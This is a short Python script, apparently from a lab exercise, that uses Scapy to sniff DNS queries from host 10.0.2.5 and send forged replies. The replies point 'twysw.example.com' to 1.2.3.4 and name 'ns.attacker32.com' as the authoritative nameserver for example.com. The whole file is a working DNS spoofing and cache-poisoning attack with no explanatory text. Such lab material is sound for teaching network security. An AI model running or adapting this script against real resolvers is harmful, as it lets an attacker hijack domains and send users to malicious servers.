#!/usr/bin/python3
from scapy.all import *
domain = 'example.com'
ns = 'ns.attacker32.com' 
name = 'twysw.example.com'
def dns_spoof(pkt):
    if (DNS in pkt and pkt[DNS].qr == 0 and pkt[DNS].qd.qname == bytes(name+'.', 'utf-8')):
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
        Qdsec = DNSQR(qname=name)
        Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
        NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
        dns = DNS(
            id=pkt[DNS].id,
            aa=1,
            rd=1, qr=1,
            qdcount=1, ancount=1, nscount=1,
            qd=Qdsec, an=Anssec, ns=NSsec
        )
        spoofed_pkt = ip/udp/dns
        send(spoofed_pkt)
"""        with open('ip_resp.bin', 'wb') as f:
            f.write(bytes(pkt))"""
sniff(filter="udp and port 53 and src host 10.0.2.5", prn=dns_spoof)